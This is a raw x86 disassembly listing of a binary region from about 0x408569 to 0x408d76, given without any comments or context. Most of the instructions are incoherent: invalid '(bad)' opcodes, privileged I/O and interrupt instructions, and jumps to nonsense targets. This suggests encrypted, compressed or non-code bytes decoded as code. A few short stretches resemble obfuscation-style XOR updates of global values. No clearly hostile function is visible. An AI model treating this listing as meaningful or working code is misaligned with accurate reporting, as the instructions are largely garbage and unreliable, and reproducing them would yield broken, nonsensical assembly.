  408569:	call   0xaa88:0x49a1f2d4
  408570:	sar    ecx,1
  408572:	repz in eax,0xed
  408575:	dec    ebp
  408576:	das    
  408577:	test   bh,0x97
  40857a:	hlt    
  40857b:	mov    dl,BYTE PTR [esi]
  40857d:	and    edi,DWORD PTR [edx]
  40857f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408580:	dec    ecx
  408581:	or     al,0xa4
  408583:	or     DWORD PTR [ebp+0x619f1f8e],0xffffffe5
  40858a:	fs in  eax,0xe3
  40858d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40858e:	repnz mov ah,0x82
  408591:	ror    DWORD PTR [esi],1
  408593:	jns    0x408577
  408595:	ja     0x40853b
  408597:	add    eax,0xc3424c14
  40859c:	pmaddwd mm3,QWORD PTR [edi]
  40859f:	test   al,0xbb
  4085a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085a2:	dec    edi
  4085a3:	sahf   
  4085a4:	mov    ebx,0x44536e3b
  4085a9:	bound  eax,QWORD PTR [ebp-0x704bb5fa]
  4085af:	xchg   edi,eax
  4085b0:	mov    dl,0xa1
  4085b2:	rcr    DWORD PTR [ebx+eax*1+0x18f23c0],1
  4085b9:	out    0x2e,eax
  4085bb:	and    dh,dh
  4085bd:	adc    DWORD PTR [edi-0x14],ebp
  4085c0:	push   esi
  4085c1:	xchg   ebx,eax
  4085c2:	mov    cl,0x8b
  4085c4:	push   eax
  4085c5:	data16 and al,0xa2
  4085c8:	imul   edx,esi,0xf9d7f82e
  4085ce:	and    BYTE PTR [esi+0x5bfd5950],0x99
  4085d5:	stc    
  4085d6:	sbb    dl,BYTE PTR [ecx]
  4085d8:	push   ecx
  4085d9:	test   eax,0x238283b0
  4085de:	mov    ebx,0x5435a6c9
  4085e3:	mov    ch,0xa2
  4085e5:	mov    edx,DWORD PTR [ebx-0x9]
  4085e8:	push   es
  4085e9:	and    BYTE PTR ds:0xcaa04f0e,cl
  4085ef:	call   0x40bf83c
  4085f4:	pop    ebx
  4085f5:	pushf  
  4085f6:	fdivrp st(4),st
  4085f8:	dec    ecx
  4085f9:	mov    esi,0x1575bd04
  4085fe:	or     DWORD PTR [ecx+0x3227f2f],0xfffffffa
  408605:	or     DWORD PTR [ebx+0x16],eax
  408608:	not    DWORD PTR [esi]
  40860a:	nop
  40860b:	fmul   DWORD PTR [ecx+0x37]
  40860e:	pop    ebx
  40860f:	retf   
  408610:	shl    DWORD PTR [edx+0x1b709966],1
  408616:	ins    DWORD PTR es:[edi],dx
  408617:	cli    
  408618:	xchg   ecx,eax
  408619:	push   eax
  40861a:	rcl    ecx,cl
  40861c:	(bad)  
  40861e:	addr16 dec esp
  408620:	mov    bl,0x32
  408622:	(bad)  [edx]
  408624:	aam    0x43
  408626:	sti    
  408627:	adc    BYTE PTR ds:0x75db15e9,ch
  40862d:	xor    al,0x6a
  40862f:	inc    esi
  408630:	jno    0x408676
  408632:	lahf   
  408633:	push   es
  408634:	scas   al,BYTE PTR es:[edi]
  408635:	jmp    0x4085d8
  408637:	ret    
  408638:	repz gs jg 0x4086ba
  40863c:	cmp    DWORD PTR [edi-0x268656d9],edx
  408642:	push   ds
  408643:	push   cs
  408644:	push   0xffffff8e
  408646:	inc    edx
  408647:	addr16 int 0xf4
  40864a:	mov    BYTE PTR [esi-0x34a0a0e6],ch
  408650:	jne    0x40865d
  408652:	imul   esp,ecx
  408655:	mov    edi,0xb4a29add
  40865a:	push   es
  40865b:	adc    eax,0xdb3ed04c
  408660:	rol    BYTE PTR [ebx-0x69338f1e],0xd5
  408667:	pushf  
  408668:	test   BYTE PTR [ebp+esi*4-0x1bc87adc],bl
  40866f:	mov    ebx,0x13c682cb
  408674:	int3   
  408675:	inc    ebp
  408676:	stc    
  408677:	jl     0x40862a
  408679:	lahf   
  40867a:	test   BYTE PTR [ecx+ecx*2+0x489f3746],al
  408681:	gs out dx,al
  408683:	add    eax,0x2eddfa7b
  408688:	push   0x9cd57aa9
  40868d:	sub    eax,0xb2d63764
  408692:	(bad)  
  408693:	jmp    0xcfac2262
  408698:	mov    edi,0xfeb8bbfc
  40869d:	adc    cl,BYTE PTR [esi+0x37e31581]
  4086a3:	inc    ebx
  4086a4:	add    BYTE PTR [ebx+0x37],bh
  4086a7:	inc    ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	outs   dx,DWORD PTR ds:[esi]
  4086af:	cmp    BYTE PTR [ebx+0x0],al
  4086b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x44656cb6],ecx
  4086ca:	pusha  
  4086cb:	mov    dl,dh
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	push   cs
  4086d4:	lods   eax,DWORD PTR ds:[esi]
  4086d5:	popf   
  4086d6:	mov    ebp,0x1e0f21ae
  4086db:	or     DWORD PTR [esi-0x780d9341],edi
  4086e1:	mov    eax,0x3d4c7483
  4086e6:	outs   dx,BYTE PTR ds:[esi]
  4086e7:	jbe    0x408718
  4086e9:	fcmovu st,st(1)
  4086eb:	ds mov ch,0x2e
  4086ee:	cwde   
  4086ef:	in     eax,dx
  4086f0:	add    DWORD PTR [edx+0x74abc0be],0xfe5a246a
  4086fa:	sub    eax,0x8b9af870
  4086ff:	cmc    
  408700:	leave  
  408701:	mov    DWORD PTR [ebx],ecx
  408703:	imul   esp
  408705:	sti    
  408706:	shr    ebp,cl
  408708:	(bad)  
  40870a:	aas    
  40870b:	cmp    esp,esp
  40870d:	cli    
  40870e:	loop   0x4086c7
  408710:	stos   DWORD PTR es:[edi],eax
  408711:	mov    ch,0x4d
  408713:	or     DWORD PTR [ecx+0xb],ecx
  408716:	push   ecx
  408717:	shl    esi,cl
  408719:	mov    eax,0xfe306a8
  40871e:	je     0x4086ee
  408720:	pop    edi
  408721:	les    esp,FWORD PTR [ecx]
  408723:	lods   al,BYTE PTR ds:[esi]
  408724:	jnp    0x408750
  408726:	jne    0x40877a
  408728:	mov    ds:0x7d6e9fd6,eax
  40872d:	out    0x78,eax
  40872f:	sub    edx,DWORD PTR [ecx+0x75]
  408732:	call   0x9aa34f8d
  408737:	mov    al,BYTE PTR [ebp+0x1f295e09]
  40873d:	push   cs
  40873e:	inc    ebx
  40873f:	and    esi,DWORD PTR [ebp+ebx*8+0x65]
  408743:	lods   al,BYTE PTR ds:[esi]
  408744:	leave  
  408745:	xor    DWORD PTR ds:0x1f39b78,esi
  40874b:	stos   DWORD PTR es:[edi],eax
  40874c:	mov    ds,edx
  40874e:	retf   
  40874f:	dec    esi
  408750:	pop    esi
  408751:	dec    ecx
  408752:	inc    ebp
  408753:	clc    
  408754:	inc    edi
  408755:	repz mov ebp,0x7149c362
  40875b:	int    0x50
  40875d:	out    dx,eax
  40875e:	es stc 
  408760:	shl    DWORD PTR [ecx+0x22],1
  408763:	push   esp
  408764:	inc    ecx
  408765:	cwde   
  408766:	mov    al,0x6f
  408768:	sbb    DWORD PTR [eax],ecx
  40876a:	dec    edx
  40876b:	inc    esp
  40876c:	mov    esp,0x7d0e5f7a
  408771:	add    al,0xb5
  408773:	in     eax,0xf3
  408775:	and    DWORD PTR [edx-0x79],0x28
  408779:	mov    esp,0x5e1ff41a
  40877e:	push   esp
  40877f:	mov    cl,0x8a
  408781:	ds mov eax,0xdef195be
  408787:	ja     0x408744
  408789:	inc    esi
  40878a:	jno    0x408766
  40878c:	int3   
  40878d:	cmc    
  40878e:	sbb    BYTE PTR [ebx-0x61],0xfa
  408792:	cmp    eax,0x11b674aa
  408797:	or     dl,BYTE PTR [edi-0x35]
  40879a:	mov    eax,ds:0xb49f3b13
  40879f:	(bad)  
  4087a0:	mov    edi,0xdb3f8d55
  4087a5:	test   BYTE PTR [ebx+0x37baebc3],al
  4087ab:	lds    esi,FWORD PTR [ecx]
  4087ad:	(bad)  
  4087ae:	mov    edi,0x5ed689
  4087b3:	das    
  4087b4:	mov    eax,0xe32f9eca
  4087b9:	adc    ch,BYTE PTR [ecx]
  4087bb:	in     eax,0x16
  4087bd:	scas   al,BYTE PTR es:[edi]
  4087be:	outs   dx,DWORD PTR ds:[esi]
  4087bf:	xor    DWORD PTR cs:[ecx-0x27],esi
  4087c3:	fisub  DWORD PTR [eax-0x631a358e]
  4087c9:	mov    ebp,0xa4d1af53
  4087ce:	out    0x7f,eax
  4087d0:	retf   
  4087d1:	int    0xb5
  4087d3:	xor    al,0xb4
  4087d5:	cdq    
  4087d6:	mov    ecx,0x9bbd25
  4087db:	push   ebp
  4087dc:	jo     0x4087b0
  4087de:	mov    eax,0xeb487dbf
  4087e3:	mov    eax,0xee6b123b
  4087e8:	adc    esp,DWORD PTR [ecx-0x7e]
  4087eb:	mov    edx,0x29a5efb4
  4087f0:	es jl  0x408869
  4087f3:	jnp    0x40882c
  4087f5:	mov    edi,0x531184a4
  4087fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087fb:	mov    bh,0x8
  4087fd:	out    dx,al
  4087fe:	imul   ecx,ebx,0x49
  408801:	lea    ebp,[ebp*1+0x260ffb2a]
  408808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408809:	shl    DWORD PTR [edx-0x2871d4f3],1
  40880f:	cmc    
  408810:	cli    
  408811:	lahf   
  408812:	mov    dh,0x6a
  408814:	imul   esp,DWORD PTR [esi-0x5b01fe8f],0xffffffa4
  40881b:	mov    ebx,ecx
  40881d:	inc    ebp
  40881e:	je     0x4087c7
  408820:	or     dh,BYTE PTR [esi-0x28]
  408823:	lds    eax,FWORD PTR ds:[edx]
  408826:	pop    ecx
  408827:	push   es
  408828:	(bad)
  40882b:	lods   eax,DWORD PTR ds:[esi]
  40882c:	inc    edi
  40882d:	xor    al,0x8f
  40882f:	pop    esp
  408830:	mov    edx,0xd784225f
  408835:	icebp  
  408836:	inc    edx
  408837:	imul   esi,DWORD PTR [eax],0xffffffd2
  40883a:	add    al,BYTE PTR [esi-0x64a3efed]
  408840:	push   eax
  408841:	fwait
  408842:	xchg   BYTE PTR [edi],dl
  408844:	jno    0x4087f0
  408846:	push   ss
  408847:	lock mov eax,ds:0xdb95b9bd
  40884d:	mov    ebx,0xe178ba48
  408852:	adc    bh,BYTE PTR [edi+0x4e]
  408855:	out    dx,eax
  408856:	cmp    dh,BYTE PTR [esi]
  408858:	std    
  408859:	cdq    
  40885a:	push   cs
  40885b:	xlat   BYTE PTR ds:[ebx]
  40885c:	mov    edx,0xb8a5f698
  408861:	sysret 
  408863:	lea    ebx,[edi+0x5b]
  408866:	shl    DWORD PTR [ecx],cl
  408868:	inc    ecx
  408869:	(bad)  [ecx+0x50ff06da]
  40886f:	pusha  
  408870:	scas   eax,DWORD PTR es:[edi]
  408871:	enter  0x7745,0x61
  408875:	jo     0x408863
  408877:	xchg   BYTE PTR [ebp+0xaae1df3],bh
  40887d:	inc    eax
  40887e:	or     ch,BYTE PTR [esi+esi*1+0x1c14cbd8]
  408885:	mov    dl,BYTE PTR [edi]
  408887:	sbb    ebx,DWORD PTR [edx+eiz*8-0x31e43610]
  40888e:	jge    0x4088e6
  408890:	jp     0x4088a7
  408892:	shr    DWORD PTR [ebx-0x31],1
  408895:	add    esp,DWORD PTR [eax]
  408897:	int    0x11
  408899:	ficom  DWORD PTR [eax-0x30]
  40889c:	push   edx
  40889d:	add    esi,DWORD PTR [ebx+ebx*2-0x52]
  4088a1:	sbb    eax,0x88c9299e
  4088a6:	bound  ebx,QWORD PTR [ecx-0x4f512af1]
  4088ac:	scas   eax,DWORD PTR es:[edi]
  4088ad:	mov    esi,0xf04a69e9
  4088b2:	fisubr WORD PTR [ebp-0x1e455e83]
  4088b8:	in     al,dx
  4088b9:	sahf   
  4088ba:	sti    
  4088bb:	ror    BYTE PTR [eax],1
  4088bd:	retf   
  4088be:	mov    edi,0xcb321639
  4088c3:	mov    eax,ds:0x5e727a81
  4088c8:	jge    0x4088ca
  4088ca:	std    
  4088cb:	mov    edi,0xfc322318
  4088d0:	adc    DWORD PTR [eax+esi*1-0x32479531],eax
  4088d7:	inc    edi
  4088d8:	ds push es
  4088da:	cdq    
  4088db:	ret    
  4088dc:	cs stos DWORD PTR es:[edi],eax
  4088de:	cmp    al,0xc5
  4088e0:	sub    eax,esp
  4088e2:	xchg   ebp,eax
  4088e3:	pop    esp
  4088e4:	in     al,dx
  4088e5:	sbb    DWORD PTR [ebp-0x4beb11a7],0x7
  4088ec:	xor    edi,esp
  4088ee:	sub    DWORD PTR cs:[ebx-0x1da56844],esp
  4088f5:	ss test ch,dl
  4088f8:	add    eax,0x466705c8
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x4337e3,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x43385b,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x4337d3,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43379f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x4338a7,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xbd66a2c
  408968:	dec    ebx
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	enter  0xb0d,0x35
  408975:	inc    ecx
  408976:	ret    0xc1c6
  408979:	xchg   edx,eax
  40897a:	mov    dh,0x3c
  40897c:	mov    esi,0x24c81e59
  408981:	std    
  408982:	loopne 0x4089fa
  408984:	fucompp 
  408987:	hlt    
  408988:	test   DWORD PTR [ebx-0x472b964e],ebx
  40898e:	aam    0x7f
  408990:	dec    edx
  408991:	fsub   st(2),st
  408993:	jo     0x4089e1
  408995:	enter  0x5a8f,0xfa
  408999:	retf   
  40899a:	pop    ds
  40899b:	repnz or al,0x6b
  40899e:	xchg   ecx,eax
  40899f:	pop    ebp
  4089a0:	ror    DWORD PTR [ebx],cl
  4089a2:	cdq    
  4089a3:	xor    al,BYTE PTR [edi-0x4aab3fda]
  4089a9:	jl     0x408a0c
  4089ab:	push   0xffffff94
  4089ad:	mov    ebx,0x2e495fa5
  4089b2:	mov    edi,0x168ebc1e
  4089b7:	outs   dx,DWORD PTR ds:[esi]
  4089b8:	mov    bh,BYTE PTR [ecx]
  4089ba:	mov    DWORD PTR [edx+0x578bd0a0],ebp
  4089c0:	dec    esi
  4089c1:	repz or ebp,DWORD PTR ds:0xaf013ccf
  4089c8:	xor    edi,DWORD PTR [ebp+0x33201cb8]
  4089ce:	mov    ecx,0x41f6be68
  4089d3:	loopne 0x408983
  4089d5:	pop    edx
  4089d6:	mov    eax,ds:0x6d4cffff
  4089db:	or     cl,0x28
  4089de:	push   es
  4089df:	test   BYTE PTR [edx+0x78],dh
  4089e2:	sar    BYTE PTR [edx-0x9],0xba
  4089e6:	retf   0xa0cb
  4089e9:	xor    al,0x7c
  4089eb:	xchg   DWORD PTR [ecx+0x5e19d317],eax
  4089f1:	jge    0x4089e5
  4089f3:	retf   
  4089f4:	mov    al,ds:0x541ded95
  4089f9:	(bad)  
  4089fa:	iret   
  4089fb:	inc    ecx
  4089fc:	pop    esi
  4089fd:	sub    cl,dl
  4089ff:	mov    DWORD PTR [esi-0x56403302],eax
  408a05:	xchg   edx,eax
  408a06:	(bad)  
  408a07:	mov    WORD PTR [eax-0x46],ds
  408a0a:	fwait
  408a0b:	sub    cl,BYTE PTR [ebx-0x79]
  408a0e:	cwde   
  408a0f:	add    ah,0x2b
  408a12:	jnp    0x4089f9
  408a14:	loope  0x4089d1
  408a16:	aas    
  408a17:	mov    bl,ch
  408a19:	bound  esp,QWORD PTR [esi+0x2]
  408a1c:	push   esp
  408a1d:	(bad)  
  408a1e:	pop    ebp
  408a1f:	xor    eax,0x73296e42
  408a24:	repnz sub al,0x22
  408a27:	sbb    esi,DWORD PTR [ebp+0x14]
  408a2a:	scas   eax,DWORD PTR es:[edi]
  408a2b:	jle    0x408a21
  408a2d:	add    bl,BYTE PTR [esi+0x13]
  408a30:	hlt    
  408a31:	inc    ebp
  408a32:	packsswb mm0,mm6
  408a35:	and    BYTE PTR [esi],cl
  408a37:	iret   
  408a38:	and    DWORD PTR [edx+0x7f418c0f],0xfcf7ff78
  408a42:	and    BYTE PTR [eax],bl
  408a44:	and    al,0xb4
  408a46:	push   cs
  408a47:	sub    DWORD PTR [esi],ecx
  408a49:	sbb    ecx,DWORD PTR [esp+ebx*8+0x16]
  408a4d:	add    al,0xfb
  408a4f:	cmc    
  408a50:	pop    eax
  408a51:	sub    ebx,ebp
  408a53:	jns    0x4089d8
  408a55:	ja     0x4089f0
  408a57:	mov    ecx,0x5ef513c7
  408a5c:	push   cs
  408a5d:	sbb    dl,al
  408a5f:	push   ecx
  408a60:	mov    esp,0xbbd85ccd
  408a65:	mov    ch,BYTE PTR [ecx-0x6a]
  408a68:	shl    DWORD PTR [ebx],cl
  408a6a:	push   0xffffffb6
  408a6c:	cwde   
  408a6d:	lods   al,BYTE PTR ds:[esi]
  408a6e:	add    BYTE PTR [ebx+0x75b79756],bl
  408a74:	les    esp,FWORD PTR [ecx-0xbe4624e]
  408a7a:	cmp    ch,bl
  408a7c:	push   esi
  408a7d:	mov    bl,0x2e
  408a7f:	dec    esi
  408a80:	xchg   edx,eax
  408a81:	adc    BYTE PTR [ecx-0x6ac6d73b],al
  408a87:	pop    ecx
  408a88:	leave  
  408a89:	dec    esi
  408a8a:	add    edi,0x31
  408a8d:	nop
  408a8e:	retf   0x4b3b
  408a91:	out    0x7e,eax
  408a93:	add    BYTE PTR [edi+0x8d6dc90],bl
  408a99:	xchg   edi,eax
  408a9a:	add    eax,0x9c6aa511
  408a9f:	adc    ch,BYTE PTR [edx-0x19]
  408aa2:	test   al,0xd8
  408aa4:	mov    ecx,0x13c2de2
  408aa9:	sbb    DWORD PTR [ebx],ebp
  408aab:	fyl2xp1 
  408aad:	inc    esi
  408aae:	(bad)  
  408aaf:	fwait
  408ab0:	push   esi
  408ab1:	push   ds
  408ab2:	jl     0x408b22
  408ab4:	lds    esi,FWORD PTR [ebx+0x19d8d018]
  408aba:	iret   
  408abb:	sbb    BYTE PTR [esi+ebp*1],bl
  408abe:	daa    
  408abf:	arpl   WORD PTR [ecx+0x52eab4ff],dx
  408ac5:	out    0x21,eax
  408ac7:	mov    cl,0x63
  408ac9:	cmp    eax,0x505599c2
  408ace:	js     0x408b2c
  408ad0:	and    BYTE PTR [edx+0x328fc383],ah
  408ad6:	daa    
  408ad7:	adc    ebx,esp
  408ad9:	js     0x408add
  408adb:	jne    0x408a8c
  408add:	inc    edi
  408ade:	push   eax
  408adf:	dec    ebp
  408ae0:	inc    eax
  408ae1:	sub    BYTE PTR ds:[ecx+0x73c99a77],ch
  408ae8:	jae    0x408ab5
  408aea:	sbb    esp,DWORD PTR [eax]
  408aec:	jae    0x408a84
  408aee:	sub    al,0x5e
  408af0:	mov    esi,0x4ae00c0a
  408af5:	fdivr  QWORD PTR [edi+0x7baf3bdb]
  408afb:	mov    ah,0x5c
  408afd:	btc    DWORD PTR ds:0x66970d4f,ebp
  408b04:	mov    bl,0x25
  408b06:	inc    edx
  408b07:	jmp    0xd9e8:0x7825cea7
  408b0e:	idiv   BYTE PTR [ebx+0x14]
  408b11:	or     ecx,DWORD PTR [ebx+0x61332cce]
  408b17:	repz (bad) 
  408b1a:	rcr    esp,cl
  408b1c:	pop    eax
  408b1d:	in     al,0x3b
  408b1f:	loop   0x408b84
  408b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b22:	mov    esi,DWORD PTR [ebp-0x63]
  408b25:	cmp    BYTE PTR [edi+0x29cf3945],bl
  408b2b:	retf   
  408b2c:	lea    edx,[ecx]
  408b2e:	daa    
  408b2f:	push   esi
  408b30:	mov    esi,0x28a012ce
  408b35:	int    0xf9
  408b37:	int3   
  408b38:	jmp    0x3fed:0xac0d92bd
  408b3f:	add    cl,BYTE PTR [edx]
  408b41:	xlat   BYTE PTR ds:[ebx]
  408b42:	jo     0x408b5d
  408b44:	mov    ds:0x61642807,al
  408b49:	imul   eax,DWORD PTR ss:[eax+eax*1+0x76],0xe65aa60
  408b52:	les    edi,FWORD PTR [edi-0x1e]
  408b55:	sub    BYTE PTR [esi+0x5493c2da],bl
  408b5b:	rcl    BYTE PTR [ebp+0x4d93ec9e],cl
  408b61:	ss in  eax,dx
  408b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b64:	leave  
  408b65:	mul    BYTE PTR [ebp-0x4888ec91]
  408b6b:	sub    ecx,DWORD PTR [edi-0x76]
  408b6e:	fcom   QWORD PTR [esp+esi*4-0x53]
  408b72:	push   ds
  408b73:	push   0x4
  408b75:	scas   eax,DWORD PTR es:[edi]
  408b76:	dec    eax
  408b77:	and    DWORD PTR [edi+0x24],esi
  408b7a:	outs   dx,DWORD PTR ds:[esi]
  408b7b:	pushf  
  408b7c:	or     ah,ah
  408b7e:	dec    edi
  408b7f:	adc    cl,cl
  408b81:	inc    edx
  408b82:	mov    edx,DWORD PTR ss:[esi+eax*4]
  408b86:	rcr    BYTE PTR [eax+0x4c],1
  408b89:	mov    ebx,DWORD PTR [ebx]
  408b8b:	pop    eax
  408b8c:	ja     0x408b2d
  408b8e:	mov    eax,0x42b02e6a
  408b93:	inc    ecx
  408b94:	xor    DWORD PTR [ebx-0x70],ebp
  408b97:	xor    cl,dh
  408b99:	stos   BYTE PTR es:[edi],al
  408b9a:	arpl   WORD PTR [edi],cx
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	das    
  408bf1:	jb     0x408c48
  408bf3:	std    
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	arpl   WORD PTR [esi+0x75db152],sp
  408c02:	outs   dx,BYTE PTR ds:[esi]
  408c03:	jne    0x408beb
  408c05:	imul   ecx,DWORD PTR [edx-0x4eae7ae7],0x4cb8b93f
  408c0f:	adc    DWORD PTR ds:0x1975574c,ebp
  408c15:	add    eax,0x550345b4
  408c1a:	test   ebp,edi
  408c1c:	and    bh,BYTE PTR [edx-0x355cc719]
  408c22:	mov    esi,0x93b8f7cb
  408c27:	inc    edx
  408c28:	cmc    
  408c29:	mov    al,ds:0x2d3b447b
  408c2e:	iret   
  408c2f:	mov    ch,0xc3
  408c31:	jae    0x408c4b
  408c33:	enter  0x8e3d,0xf7
  408c37:	mov    BYTE PTR [edi+0x75843f7b],bl
  408c3d:	std    
  408c3e:	or     ebx,DWORD PTR [eax+0x24]
  408c41:	cmp    dh,BYTE PTR [ecx-0x2b]
  408c44:	mov    al,ds:0x5079d2a2
  408c49:	sub    esi,DWORD PTR [edx-0x2]
  408c4c:	push   cs
  408c4d:	adc    dh,BYTE PTR [ebp+0x74036a5]
  408c53:	lea    edi,ss:[esi+0x3b]
  408c57:	and    eax,eax
  408c59:	push   ds
  408c5a:	imul   eax,DWORD PTR [ecx],0x38
  408c5d:	xchg   ecx,eax
  408c5e:	repz jg 0x408c93
  408c61:	call   0x963bf162
  408c66:	mov    al,ds:0x343dc44a
  408c6b:	repz out 0xb6,eax
  408c6e:	test   BYTE PTR [ebx-0x53ff3809],bh
  408c74:	mov    dl,0xc0
  408c76:	jne    0xcf96022e
  408c7c:	std    
  408c7d:	leave  
  408c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c7f:	sub    DWORD PTR [esi-0x26],eax
  408c82:	or     edx,DWORD PTR [edi+0x49ebfbd2]
  408c88:	mov    dl,0x8e
  408c8a:	pop    esi
  408c8b:	inc    esp
  408c8c:	daa    
  408c8d:	or     DWORD PTR [edi+0x51],esp
  408c90:	add    al,0xdc
  408c92:	mov    DWORD PTR [eax-0x38],eax
  408c95:	popf   
  408c96:	push   edx
  408c97:	push   ebx
  408c98:	push   ds
  408c99:	cmp    esi,edi
  408c9b:	pop    ds
  408c9c:	rcr    DWORD PTR [ebx-0xed71231],0x4b
  408ca3:	or     ah,dh
  408ca5:	mov    ebp,0x8f4e14de
  408caa:	xchg   BYTE PTR [eax-0x66],ch
  408cad:	enter  0x7dcd,0x94
  408cb1:	(bad)  
  408cb2:	rcr    DWORD PTR [ecx+0x36552289],cl
  408cb8:	iret   
  408cb9:	pop    ecx
  408cba:	and    eax,0x7a946cfd
  408cbf:	sbb    DWORD PTR [esi+esi*2+0x713befa1],esi
  408cc6:	loop   0x408ce7
  408cc8:	and    DWORD PTR [ecx-0x32afca3c],0xffffffdf
  408ccf:	adc    al,0x2f
  408cd1:	or     BYTE PTR [edx+0x58],bl
  408cd4:	adc    dl,0x15
  408cd7:	fnsave [ebp+0xb]
  408cda:	mov    ch,0xbc
  408cdc:	mov    ds:0x71e8c130,eax
  408ce1:	jg     0x408c8c
  408ce3:	inc    DWORD PTR [ecx]
  408ce5:	outs   dx,DWORD PTR ds:[esi]
  408ce6:	icebp  
  408ce7:	push   0xfffffff6
  408ce9:	mov    dh,0x57
  408ceb:	cdq    
  408cec:	sub    BYTE PTR [esi],dl
  408cee:	addr16 adc eax,0x754b3d63
  408cf4:	mov    ecx,0xb5a689ae
  408cf9:	scas   al,BYTE PTR es:[edi]
  408cfa:	jns    0x408d38
  408cfc:	ins    BYTE PTR es:[edi],dx
  408cfd:	pop    es
  408cfe:	into   
  408cff:	xchg   ebp,eax
  408d00:	jae    0x408d19
  408d02:	hlt    
  408d03:	push   edi
  408d04:	inc    esp
  408d05:	jne    0x408cdc
  408d07:	out    0x62,al
  408d09:	repnz test al,0x7c
  408d0c:	gs dec ebp
  408d0e:	or     BYTE PTR [ecx-0x4],bl
  408d11:	jnp    0x408d43
  408d13:	push   es
  408d14:	push   ecx
  408d15:	hlt    
  408d16:	push   ecx
  408d17:	shr    BYTE PTR [ebx-0x52],cl
  408d1a:	aam    0x6
  408d1c:	push   ss
  408d1d:	addr16 mov al,ds:0xb355
  408d21:	(bad)  
  408d22:	push   esp
  408d23:	cmc    
  408d24:	or     esp,esi
  408d26:	dec    eax
  408d27:	xlat   BYTE PTR ds:[ebx]
  408d28:	cs mov cl,0x1c
  408d2b:	xchg   al,ch
  408d2d:	jae    0x408cd2
  408d2f:	xor    al,0x8f
  408d31:	addr16 mov ch,0x3e
  408d34:	mov    al,ds:0xa350a43b
  408d39:	fnop   
  408d3b:	push   es
  408d3c:	jl     0x408cfb
  408d3e:	jecxz  0x408d6b
  408d40:	cmp    DWORD PTR [ebx+ebp*1-0x112cebda],eax
  408d47:	inc    esi
  408d48:	fistp  DWORD PTR ds:0xea1e9904
  408d4e:	stos   BYTE PTR es:[edi],al
  408d4f:	xchg   edi,eax
  408d50:	push   esi
  408d51:	in     eax,0xc4
  408d53:	sti    
  408d54:	shl    BYTE PTR [eax+0x2a],0x31
  408d58:	xor    DWORD PTR [eax],edi
  408d5a:	pop    eax
  408d5b:	ins    DWORD PTR es:[edi],dx
  408d5c:	adc    BYTE PTR [ebx-0x1f],0xa5
  408d60:	loopne 0x408cfd
  408d62:	xchg   esp,eax
  408d63:	int3   
  408d64:	push   esp
  408d65:	aad    0x61
  408d67:	xor    ecx,DWORD PTR [edi+0x75130205]
  408d6d:	or     BYTE PTR [edi+edx*1],cl
  408d70:	retf   
  408d71:	pop    edi
  408d72:	jg     0x408d0a
  408d74:	sti    
  408d75:	aas    
  408d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
